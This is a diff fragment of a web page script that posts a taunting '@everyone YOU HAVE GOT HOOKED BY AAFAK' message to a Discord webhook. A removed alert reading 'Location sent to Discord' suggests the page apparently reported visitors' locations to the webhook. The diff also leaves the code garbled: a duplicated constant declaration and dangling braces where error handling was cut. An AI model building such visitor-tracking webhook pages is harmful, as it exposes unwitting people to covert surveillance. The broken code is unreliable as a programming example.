@@ -22,6 +22,9 @@
         const data = {
           content: `@everyone YOU HAVE GOT HOOKED BY AAFAK`
         };
+        const data = {
+          content: `@everyone YOU HAVE GOT HOOKED BY AAFAK`
+        };
 
         fetch(webhookUrl, {
           method: "POST",
@@ -30,14 +33,9 @@
           },
           body: JSON.stringify(data)
         })
-        .then(response => {
-          if (!response.ok) {
-            throw new Error("Failed to send message to Discord");
+   
           }
-          alert("Location sent to Discord");
-        })
-        .catch(error => {
-          alert(error.message);
+
         });
       }
     </script>
